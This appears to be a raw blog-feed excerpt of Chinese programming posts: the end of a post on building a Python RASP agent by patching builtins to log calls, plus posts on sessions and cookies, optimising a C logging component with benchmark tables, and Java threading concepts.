&lt;h3&gt;&lt;strong&gt;脑洞时间&lt;/strong&gt;&lt;/h3&gt;

&lt;p&gt;之前写java程序的时候，使用过JNI技术，也就是java的C接口，很多java做不到的事情，使用C接口就可以做到，还可以访问java对象。联想到Python Monkey Patch失败的问题，&lt;strong&gt;很有可能是在Python层做的禁止&lt;/strong&gt;，是否可以通过&lt;strong&gt;Python C API操作对象呢&lt;/strong&gt;？&lt;/p&gt;

&lt;p&gt;每一个类对象都有一个__dict__，里面包含着每个类的属性信息，例如如果我们想从str取出decode函数，可以这么干：&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;str.__dict__[&quot;decode&quot;]&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;因此咱们只要获取__dict__属性，对这个属性进行修改，就可以达到替换的目的。咱们使用C API来获取：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/899843/201902/899843-20190210124541882-543172817.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;通过patch_builtin函数，我们就可以获取__dict__对象，然后使用setattr和getattr修改属性即可，由于我们不改变原有的函数，只是收集日志，所以基本上对虚拟机运行没有影响。最后实验一下效果：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/899843/201902/899843-20190210124641734-498414461.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt; 到此为止，Python RASP的所有的技术点都结束了。。。呼吸一口新鲜空气。。。&lt;/p&gt;

&lt;h2&gt;亦正亦邪&lt;/h2&gt;
&lt;p&gt; 技术点结束了，下面就需要落地了。Python RASP整体分为两部分：Agent和Server,Agent负责hook函数，收集函数日志，并发给Server，Server负责处理日志数据，并制定相应的策略进行过滤报警。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/899843/201902/899843-20190210124810523-1407344869.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;


&lt;p&gt;在落地的过程中，有以下问题需要注意：&lt;/p&gt;

&lt;ol class=&quot;list-paddingleft-2&quot; readability=&quot;1&quot;&gt;&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;数据压制：Agent在采集函数日志的时候，因为很多Python程序都是做周期性任务，重复数据会很多。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;兼容性： Python RASP 对于Py2和Py3要进行兼容性处理。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;自保护：其实对于Python RASP有很多逃逸的方式，对此我们要进行加固，下一篇我们会讲解逃逸和加固。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;在设计策略的过程中，注意收集一些&lt;strong&gt;执行命令和网络&lt;/strong&gt;的函数,在下一篇我会列举出来。&lt;/p&gt;

&lt;p&gt;大家有没有想过Python RASP中使用的技术，是不是&lt;strong&gt;特别像木马后门&lt;/strong&gt;。这可能就是所谓的&lt;strong&gt;技术本没有好坏，看你怎么用罢了&lt;/strong&gt;。&lt;/p&gt;

&lt;div id=&quot;cnblogs_post_body&quot; class=&quot;blogpost-body&quot; readability=&quot;57&quot;&gt;
&lt;h2 id=&quot;最后&quot;&gt;最后&lt;/h2&gt;
&lt;p&gt;关注公众号：&lt;strong&gt;七夜安全博客&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2015.cnblogs.com/blog/899843/201604/899843-20160412112303145-1979448153.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;回复【1】：领取 Python数据分析 教程大礼包&lt;/li&gt;
&lt;li&gt;回复【2】：领取 Python Flask 全套教程&lt;/li&gt;
&lt;li&gt;回复【3】：领取 某学院 机器学习 教程&lt;/li&gt;
&lt;li&gt;回复【4】：领取 爬虫 教程&lt;/li&gt;
&lt;li&gt;回复【5】：领取 编译原理 教程 &lt;/li&gt;
&lt;li&gt;回复【6】：领取 渗透测试 教程 &lt;/li&gt;
&lt;li&gt;回复【7】：领取 人工智能数学基础 教程&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;
&lt;p&gt;本文章属于原创作品,欢迎大家转载分享，禁止修改文章的内容。尊重原创,转载请注明来自:七夜的故事 http://www.cnblogs.com/qiyeboy/&lt;/p&gt;

</description>
<pubDate>Sun, 10 Feb 2019 04:57:00 +0000</pubDate>
<dc:creator>七夜的故事</dc:creator>
<og:description>前言 今天讲的内容会很深，包括一些 Python的高级用法和一些自己创造的黑科技，前半部分内容你们可能听过，后半部分内容就真的是黑科技了。。。 深入的研究和思考，总会发现很多有意思的东西。每</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/qiyeboy/p/10359081.html</dc:identifier>
</item>
<item>
<title>关于session和cookie - keke..lele</title>
<link>http://www.cnblogs.com/kekelele/p/10359068.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/kekelele/p/10359068.html</guid>
<description>&lt;p&gt;  &lt;span&gt;近期有被问到一个问题--“session和cookie的本质是什么？为什么需要这两种技术？”，我一脸懵，所以在此记录一下整理的一些知识点。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;  首先，&lt;span&gt;Session和Cookie的本质是会话跟踪技术&lt;/span&gt;。&lt;span&gt;web应用程序是使用HTTP协议传输数据的，由于HTTPS是无状态的，一旦数据交换完毕，客户端与服务器端的连接就会关闭，再次交换数据需要重新建立连接。&lt;/span&gt;简单一点说明问题：HTTP协议是无状态的协议。这就意味着服务器无法从连接上跟踪会话。即用户A购买了一件商品放入购物车内，当再次购买商品时服务器已经无法判断该购买行为是属于用户A的会话还是用户B的会话了。要跟踪该会话，必须引入一种机制。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; &lt;/span&gt; &lt;span&gt;首先是Cookie&lt;/span&gt;，Cookie本质是服务器发送给客户端的特殊信息，而这些信息是以文本的形式存储在客户端的，然后客户端每次发送请求的时候，都会带上这些信息，从而可以让服务器知道是哪一个用户，个人理解，Cookie就好像是一个身份证，无论要去办什么事情，请随时带着自己的身份证，以证明你是谁，接着才能知道接下来的事情应该是什么。下面简单的用图的方式说明一下，cookie传递的过程：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/856589/201902/856589-20190210120334584-715313552.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;注意：cookie具有不可跨域性。&lt;/p&gt;
&lt;p&gt;  &lt;span&gt;然后是Session&lt;/span&gt;,Session是另一种记录客户状态的机制，不同于Cookie技术，Session是记录在服务器端的。客户端浏览器访问服务器的时候，服务器把信息以某种形式记录下来。产生一个SessionId来表明这块内存空间是你的（在tomcat中称为jsesessionId）。同时，会在服务器返回给浏览器端时，将sessionId返回，然后记录在Cookie中，也就是只要浏览器没有关闭，并且没有失效，那么你每次发送信息都会带着sessionId，那么服务器就会根据sessionId找到对应的存储空间，找到相应的信息，从而就完全能将http无状态的问题解决掉了。但是，如果浏览器关闭，那么服务器就会将对应的sessionId对应的存储空间清除，下次登陆的时候，重新产生新的存储空间和对应的sessionId。&lt;/p&gt;
&lt;p&gt;  注意：当程序需要为某个客户端的请求创建一个session时，服务器首先检查这个客户端的请求里是否已包含了sessionId，如果已包含则说明以前已经为此客户端创建过session。如果客户端请求不包含sessionId，则为此客户端创建一个session并且生成一个与此session相关的sessionid。&lt;/p&gt;


&lt;p&gt;参考文章：https://www.cnblogs.com/zhouhbing/p/4204132.html&lt;/p&gt;
&lt;p&gt;https://blog.csdn.net/jpygx123/article/details/82973816&lt;/p&gt;
</description>
<pubDate>Sun, 10 Feb 2019 04:35:00 +0000</pubDate>
<dc:creator>keke..lele</dc:creator>
<og:description>近期有被问到一个问题--“session和cookie的本质是什么？为什么需要这两种技术？”，我一脸懵，所以在此记录一下整理的一些知识点。 首先，Session和Cookie的本质是会话跟踪技术。we</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/kekelele/p/10359068.html</dc:identifier>
</item>
<item>
<title>日志组件优化报告 - 皇家救星</title>
<link>http://www.cnblogs.com/kingstarer/p/10359022.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/kingstarer/p/10359022.html</guid>
<description>&lt;h2&gt;背景&lt;/h2&gt;
&lt;p&gt;目前项目组日志组件存在以下问题：&lt;/p&gt;
&lt;p&gt;1 日志文件每写一次日志就打开关闭一次，存在性能浪费&lt;/p&gt;
&lt;p&gt;2 日志里面获取时间需要调用localtime、stat，在频繁调用时该函数消耗cpu比较多&lt;/p&gt;
&lt;p&gt;3 日志组件获取环境变量时未判断是否成功，如果环境变量没设置会引起程序core&lt;/p&gt;
&lt;p&gt;4 日志组件在写日志时，先初始化局部变量再判断日志级别，可以优化&lt;/p&gt;
&lt;p&gt;5 日志组件里面有不少处调用了sprintf、ReplaceEnvVar和strlen，其实可以避免&lt;/p&gt;
&lt;p&gt;6 日志组件调用了大量不可重入函数，在信号处理函数中写日志可能引起core&lt;/p&gt;
&lt;h2&gt;改造方案&lt;/h2&gt;
&lt;h3&gt;1 增加文件句柄缓存与输出缓冲：&lt;/h3&gt;
&lt;p&gt;         增加一个环境变量HIGH_PERFORMANCE_LOG，默认值为0，不启用。&lt;/p&gt;
&lt;p&gt;当HIGH_PERFORMANCE_LOG为1时，每次打开日志后将日志文件名记录到g_logInfo. sFullLogName，写完日志后暂时不执行fclose。&lt;/p&gt;
&lt;p&gt;下次写日志时判断待写日志文件名是否与g_logInfo. sFullLogName一致，如果一致则不用重新打开文件。否则先将日志文件句柄关闭再进行打开日志文件的流程。&lt;/p&gt;
&lt;p&gt;增加一个环境变量HIGH_PERFORMANCE_LOG_CACHE，默认值为0，不启用。在HIGH_PERFORMANCE_LOG_CACHE和HIGH_PERFORMANCE_LOG都为1时，写完日志后不立即执行刷新到磁盘（不调用fflush）&lt;/p&gt;

&lt;h3&gt;2 减少非必要系统函数调用：&lt;/h3&gt;
&lt;p&gt;增加函数localtime项目组代替原来的localtime，每次调用localtime项目组时先判断是否与上次调用间隔超过1分钟，如果没超过则使用上次调用localtime返回的结果，如果超过则重新调用localtime并且将结果缓存起来待下次使用。这样从原来一分钟调用多次localtime变成一分钟调用一次。&lt;/p&gt;
&lt;p&gt;修改函数CommonGetCurrentDate，首次调用时记录当天起始秒数和第二天起始秒数，并且将返回的日志缓存起来。之后每次调用判断时间是否当天范围内，如果是则直接使用缓存返回，否则重复上面流程。样从原来天调用多次localtime变成一天调用一次。&lt;/p&gt;

&lt;p&gt;增加环境变量LOG_SYSCALL_INTERVAL_TIMES，默认值为100，每写LOG_SYSCALL_INTERVAL_TIMES次日志时才执行一次stat（如果缓存打开情况，需要先调用fflush将日志缓冲刷出），不需要每写一次日志就检查一次。注意，由于每100行才检查一次日志大小，所以会影响原来50m切换一次日志文件的逻辑，不一定精确的在50m时切换，会略大一些。&lt;/p&gt;

&lt;h3&gt;3 获取环境变量失败增加默认值：&lt;/h3&gt;
&lt;p&gt;改造原来获取环境变量的代码，增加环境变量获取失败时使用默认值的逻辑，避免异常情况下导致程序core&lt;/p&gt;

&lt;h3&gt;4 将判断日志级别的逻辑往前提：&lt;/h3&gt;
&lt;p&gt;进入写日志逻辑后，先判断当前日志级别是否需要输出日志，如果不需要则直接返回。减少非必要的变量初始化操作。&lt;/p&gt;
&lt;h3&gt;5 使用耗时较小的函数代替耗时长的函数：&lt;/h3&gt;
&lt;p&gt;日志组件每次写日志时需要使用ReplaceEnvVar函数替换日志文件路径里面的变量， 现改为在初始化时就调用ReplaceEnvVar将文件路径变量替换完。后面写日志时使用ifNeedReplaceEnvVar判断是否需要替换变量，如果不需要则不调用ReplaceEnvVar&lt;/p&gt;
&lt;p&gt;把简单的sprintf调用改为同功能其它函数代替，如将fprintf(fp, &quot;\n&quot;)改为fputc ('\n', fp)&lt;/p&gt;
&lt;p&gt;判断字符串是否为空，不使用strlen(str) == 0的写法，改为str[0] == '\0'&lt;/p&gt;
&lt;h2&gt;非功能测试对比&lt;/h2&gt;
&lt;p&gt;测试写20万行日志改造前后日志组件消耗时间&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://img2018.cnblogs.com/blog/781609/201902/781609-20190210114406708-1680569998.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt; &lt;img src=&quot;https://img2018.cnblogs.com/blog/781609/201902/781609-20190210114417600-1566991022.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;




&lt;p&gt;结果如下：&lt;/p&gt;
&lt;p&gt;单位ms&lt;/p&gt;
&lt;table border=&quot;1&quot; cellspacing=&quot;0&quot; cellpadding=&quot;0&quot;&gt;&lt;tbody readability=&quot;3&quot;&gt;&lt;tr readability=&quot;9&quot;&gt;&lt;td valign=&quot;top&quot; width=&quot;94&quot;&gt;

&lt;/td&gt;
&lt;td valign=&quot;top&quot; width=&quot;76&quot;&gt;
&lt;p&gt;不设置环境变量&lt;/p&gt;
&lt;/td&gt;
&lt;td valign=&quot;top&quot; width=&quot;123&quot;&gt;
&lt;p&gt;HIGH_PERFORMANCE_LOG=1&lt;/p&gt;

&lt;/td&gt;
&lt;td valign=&quot;top&quot; width=&quot;151&quot; readability=&quot;5&quot;&gt;
&lt;p&gt;HIGH_PERFORMANCE_LOG=1&lt;/p&gt;
&lt;p&gt;HIGH_PERFORMANCE_LOG_CACHE=1&lt;/p&gt;
&lt;/td&gt;
&lt;td valign=&quot;top&quot; width=&quot;161&quot; readability=&quot;7&quot;&gt;
&lt;p&gt;HIGH_PERFORMANCE_LOG=1&lt;/p&gt;
&lt;p&gt;HIGH_PERFORMANCE_LOG_CACHE=1&lt;/p&gt;
&lt;p&gt;LOG_SYSCALL_INTERVAL_TIMES=1000&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td valign=&quot;top&quot; width=&quot;94&quot;&gt;
&lt;p&gt;新WrtieLog&lt;/p&gt;
&lt;/td&gt;
&lt;td valign=&quot;top&quot; width=&quot;76&quot;&gt;
&lt;p&gt;4836.7&lt;/p&gt;
&lt;/td&gt;
&lt;td valign=&quot;top&quot; width=&quot;123&quot;&gt;
&lt;p&gt;1001.88&lt;/p&gt;
&lt;/td&gt;
&lt;td valign=&quot;top&quot; width=&quot;151&quot;&gt;
&lt;p&gt;453.12&lt;/p&gt;
&lt;/td&gt;
&lt;td valign=&quot;top&quot; width=&quot;161&quot;&gt;
&lt;p&gt;454.28&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td valign=&quot;top&quot; width=&quot;94&quot;&gt;
&lt;p&gt;新HtLog&lt;/p&gt;
&lt;/td&gt;
&lt;td valign=&quot;top&quot; width=&quot;76&quot;&gt;
&lt;p&gt;5603.4&lt;/p&gt;
&lt;/td&gt;
&lt;td valign=&quot;top&quot; width=&quot;123&quot;&gt;
&lt;p&gt;1355.96&lt;/p&gt;
&lt;/td&gt;
&lt;td valign=&quot;top&quot; width=&quot;151&quot;&gt;
&lt;p&gt;1253.96&lt;/p&gt;
&lt;/td&gt;
&lt;td valign=&quot;top&quot; width=&quot;161&quot;&gt;
&lt;p&gt;1277.58&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td valign=&quot;top&quot; width=&quot;94&quot;&gt;
&lt;p&gt;新DebugLog&lt;/p&gt;
&lt;/td&gt;
&lt;td valign=&quot;top&quot; width=&quot;76&quot;&gt;
&lt;p&gt;7017.66&lt;/p&gt;
&lt;/td&gt;
&lt;td valign=&quot;top&quot; width=&quot;123&quot;&gt;
&lt;p&gt;2600.98&lt;/p&gt;
&lt;/td&gt;
&lt;td valign=&quot;top&quot; width=&quot;151&quot;&gt;
&lt;p&gt;2323.88&lt;/p&gt;
&lt;/td&gt;
&lt;td valign=&quot;top&quot; width=&quot;161&quot;&gt;
&lt;p&gt;2333.98&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td valign=&quot;top&quot; width=&quot;94&quot;&gt;
&lt;p&gt;旧WrtieLog&lt;/p&gt;
&lt;/td&gt;
&lt;td valign=&quot;top&quot; width=&quot;76&quot;&gt;
&lt;p&gt;7388.92&lt;/p&gt;
&lt;/td&gt;
&lt;td valign=&quot;top&quot; width=&quot;123&quot;&gt;
&lt;p&gt;7442.24&lt;/p&gt;
&lt;/td&gt;
&lt;td valign=&quot;top&quot; width=&quot;151&quot;&gt;
&lt;p&gt;7196.72&lt;/p&gt;
&lt;/td&gt;
&lt;td valign=&quot;top&quot; width=&quot;161&quot;&gt;
&lt;p&gt;7380.76&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td valign=&quot;top&quot; width=&quot;94&quot;&gt;
&lt;p&gt;旧HtLog&lt;/p&gt;
&lt;/td&gt;
&lt;td valign=&quot;top&quot; width=&quot;76&quot;&gt;
&lt;p&gt;7654.6&lt;/p&gt;
&lt;/td&gt;
&lt;td valign=&quot;top&quot; width=&quot;123&quot;&gt;
&lt;p&gt;7712.28&lt;/p&gt;
&lt;/td&gt;
&lt;td valign=&quot;top&quot; width=&quot;151&quot;&gt;
&lt;p&gt;7498.46&lt;/p&gt;
&lt;/td&gt;
&lt;td valign=&quot;top&quot; width=&quot;161&quot;&gt;
&lt;p&gt;7655.82&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td valign=&quot;top&quot; width=&quot;94&quot;&gt;
&lt;p&gt;旧DebugLog&lt;/p&gt;
&lt;/td&gt;
&lt;td valign=&quot;top&quot; width=&quot;76&quot;&gt;
&lt;p&gt;9404.58&lt;/p&gt;
&lt;/td&gt;
&lt;td valign=&quot;top&quot; width=&quot;123&quot;&gt;
&lt;p&gt;9431.44&lt;/p&gt;
&lt;/td&gt;
&lt;td valign=&quot;top&quot; width=&quot;151&quot;&gt;
&lt;p&gt;8805.68&lt;/p&gt;
&lt;/td&gt;
&lt;td valign=&quot;top&quot; width=&quot;161&quot;&gt;
&lt;p&gt;9049.94&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td valign=&quot;top&quot; width=&quot;94&quot;&gt;
&lt;p&gt;效率比&lt;/p&gt;
&lt;/td&gt;
&lt;td valign=&quot;top&quot; width=&quot;76&quot;&gt;
&lt;p&gt;0.65&lt;/p&gt;
&lt;/td&gt;
&lt;td valign=&quot;top&quot; width=&quot;123&quot;&gt;
&lt;p&gt;0.13&lt;/p&gt;
&lt;/td&gt;
&lt;td valign=&quot;top&quot; width=&quot;151&quot;&gt;
&lt;p&gt;0.06&lt;/p&gt;
&lt;/td&gt;
&lt;td valign=&quot;top&quot; width=&quot;161&quot;&gt;
&lt;p&gt;0.06&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;（50次平均值  测试多次结果偏差不大）&lt;/p&gt;

&lt;p&gt;基准测试：&lt;/p&gt;

&lt;p&gt; &lt;img src=&quot;https://img2018.cnblogs.com/blog/781609/201902/781609-20190210114437878-850320265.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://img2018.cnblogs.com/blog/781609/201902/781609-20190210114510450-1459273145.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;测试日志记录：&lt;/p&gt;


&lt;p&gt;结论：&lt;/p&gt;

&lt;p&gt;改造后日志组件性能有所提高，效率提高约44%~70%&lt;/p&gt;

&lt;p&gt;需要注意HIGH_PERFORMANCE_LOG环境变量启用的情况，如果程序写日志过程中日志文件被删除或者移走，程序不能即时发现，仍然会往原来的日志文件写日志。&lt;/p&gt;
&lt;p&gt;需要等到写满LOG_SYSCALL_INTERVAL_TIMES行日志后才会触发日志文件重新打开关闭功能。&lt;/p&gt;

&lt;h2&gt;callgrind分析情况&lt;/h2&gt;


&lt;h2&gt;后续优化计划&lt;/h2&gt;
&lt;p&gt;如果以后日志组件再次成为性能瓶颈，可以考虑以下优化：&lt;/p&gt;
&lt;p&gt;1 使用linux文件映射进行日志文件读写，代替现有的标准库函数。这样可以减少数据拷贝。&lt;/p&gt;
&lt;p&gt;2 写日志时使用流压缩，边写日志边压缩，减少磁盘消耗。&lt;/p&gt;
&lt;p&gt;3 实在不行考虑异步落盘，先将日志数据写到共享内存，由专用的日志进程写到日志文件。&lt;/p&gt;

</description>
<pubDate>Sun, 10 Feb 2019 03:46:00 +0000</pubDate>
<dc:creator>皇家救星</dc:creator>
<og:description>背景 目前项目组日志组件存在以下问题： 1 日志文件每写一次日志就打开关闭一次，存在性能浪费 2 日志里面获取时间需要调用localtime、stat，在频繁调用时该函数消耗cpu比较多 3 日志组件</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/kingstarer/p/10359022.html</dc:identifier>
</item>
<item>
<title>Java多线程概念简介 多线程中篇（一） - noteless</title>
<link>http://www.cnblogs.com/noteless/p/10354673.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/noteless/p/10354673.html</guid>
<description>&lt;p&gt;&lt;span&gt;在线程的相关介绍中，有讲到“线程的实现”分为三种：内核支持，用户级以及两者混合。（这只是一种简要的分类）&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;Java线程在JDK1.2之前，是用户线程实现的&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;而在JDK1.2中，线程模型变为基于操作系统原生线程模型来实现的&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;所以说Java虚拟机中线程的映射实现，是受制于操作系统的，操作系统支持怎样的线程模型，决定了Java虚拟机中线程的样子。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;虚拟机规范中也并未限定Java线程需要使用哪种线程模型来实现。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;线程模型只对线程的并发规模和操作成本产生影响，对Java程序的编码和运行过程来说，这些差异都是透明的。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;目前因为Windows和Linux系统提供的线程模型就是一对一的，所以对于Sun JDK来说，它的Windows版与Linux版都是使用一对一的线程模型实现的，一条Java线程就映射到一条轻量级进程之中&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;&lt;span&gt;简言之，现在的JDK线程模型基于操作系统原生线程，所以模型依赖于操作系统对线程的支持，另外Windows和Linux系统提供的线程模型就是一对一的&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;所以可以简单认为：&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;&lt;span&gt;现在Java线程与操作系统线程一对一映射&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;现在的Java线程，就是操作系统中的线程&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;至于JVM将Java线程与操作系统的线程是如何映射的？不同的操作系统中具体的线程是如何实现的？是另外的两个很深的问题。&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;之所以提到Java线程与操作系统线程，其实是想说，操作系统中将程序的运行抽象为进程和线程，有一套抽象的理论体系，其实Java线程与他们是同根同源的，核心思维逻辑是相同的，所以前面简单了解到的操作系统对于进程、线程的相关内容，并不是那么的废话.....￣□￣｜｜&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;不过尽管相似之处太多太多，虽同根同源，但是却又千差万别，每个人从生物的角度来说，骨骼多少块？肌肉多少块？几只眼睛？几只耳朵？..尽管这都是相同的，但是每个人真的一样么，脾气？秉性？能力？...  &lt;/span&gt;&lt;/p&gt;
&lt;div readability=&quot;119&quot;&gt;
&lt;h3&gt;&lt;span&gt;一切都是Thread&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;Thread是Java对线程的抽象描述，所以多线程编程模型必然是针对Thread&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;不管JVM与操作系统的线程到底如何映射，到底如何运行，面对Java，程序员看到的就只是Thread&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;代码中操作的这个Thread类的实例，就好比是操作系统底层线程的一个指针（句柄），你想这个线程怎么样，通过操作这个Thread实例对象即可&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;抛开之前篇章中关于操作系统、进程、线程、同步、控制、死锁等底层基础知识的介绍，从Java多线程编程的视角看，我们就是在操纵不同的Thread对象实例，对这些实例进行不同的配置，并且让他们相互协作。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;Thread是一个类，用于描述了线程这一概念，Thread有自身的属性信息比如名称，这些属性信息用于描述线程本身或者用于支撑线程可以操作的行为。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;如同我们定义一个Person类，这个类拥有一些属性和方法，然后定义了一些实例对象进行协作。   &lt;/span&gt;&lt;/p&gt;
&lt;h3&gt;&lt;span&gt;多线程开发就是操纵Thread对象&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;&lt;span&gt;Java多线程程序开发中，程序员创建Thread类的实例，并且对实例进行配置，然后通过可操作的行为方法对他们进行管理调度，使程序以多线程的形式运行&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;在神话故事中，女娲娘娘抟土造人，每一个人都是“人类”的一个实例，每个人有姓名性别等属性信息，“人类”有自身的能力（行走，说话，思考，认知等），通过后天的努力学习也都有各自的能力（线程任务），整个世界由一个个不同的人，整个社会的活动由所有的人的相互的行为交互构成。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;对于Java多线程程序开发中的程序员们来说，不就相当于神话故事中的女娲娘娘么&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;整个多线程的世界里面，都是Thread的实例对象，程序员负责创建、配置、管理调度这些对象，也就形成了支持多线程的程序了。&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;尽管多线程编程非常繁琐、复杂、易错，但是如果理解清楚了Thread的抽象模型，并且对多线程编程模型中的解决思路熟悉，就能够编写出来良好的多线程程序。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;Thread的抽象模型往简单了说就是Thread这个类，他有属性字段，有public方法，也有封装到线程任务（Runnable），对于一个Thread的设置，他就那些可配置项目，不多不少&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;所以只要你理解了Thread的的抽象模型，那么你就能够很清晰的对你需要的Thread进行配置。&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;而多线程编程模型中的解决思路就如同下棋时的套路那般，可以让你更好更快更全面的写出来多线程应用程序。&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;所以说，什么是Java多线程编程？&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;只有两个步骤，&lt;/span&gt;&lt;span&gt;&lt;strong&gt;创建Thread 对象，使用Thread对象&lt;/strong&gt;&lt;/span&gt;&lt;span&gt;，看起来似乎是超乎寻常的简单&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;使用电脑也很简单，按下电源键开机，使用鼠标和键盘，说起来也是非常的简单，但是使用计算机完成工作任务，却不是一件轻松的事情。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;多线程不巧的是，也是如此，首先多线程编程模型的概念源于操作系统中的多线程（进程），然后有千差万别，所以对于Thread抽象模型的理解本身就具有一定的门槛&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;另外，对于线程的操作有多种方法，既然是多线程就不止一个线程，那么多线程、多交互方法，必然产生很多种复杂的协作逻辑，如何能够正确高效的组织，也是非常考验智商的。   &lt;/span&gt;&lt;/p&gt;
&lt;h3&gt;&lt;span&gt;Java线程逻辑&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;操作系统中我们对进程进行了介绍，对于进程作为操作系统对于程序运行的抽象，核心为&lt;/span&gt;&lt;span&gt;&lt;strong&gt;进程控制、进程同步、进程通信&lt;/strong&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;我们前面有说到Java多线程与操作系统中的线程（进程）同根同源，其实Java的多线程编程模型核心也是这三部分&lt;/span&gt;&lt;/p&gt;
&lt;div&gt;
&lt;ul&gt;&lt;li&gt;&lt;span&gt;&lt;strong&gt;对于Thread类本身，拥有其自身的属性，比如名字、Id、优先级、状态等，这就是进程的控制信息；&lt;/strong&gt;&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;&lt;strong&gt;对于Thread中封装的任务，Java提供了synchronized，volatile关键字用于控制共享资源的访问，这就是进程的同步；&lt;/strong&gt;&lt;/span&gt;&lt;/li&gt;
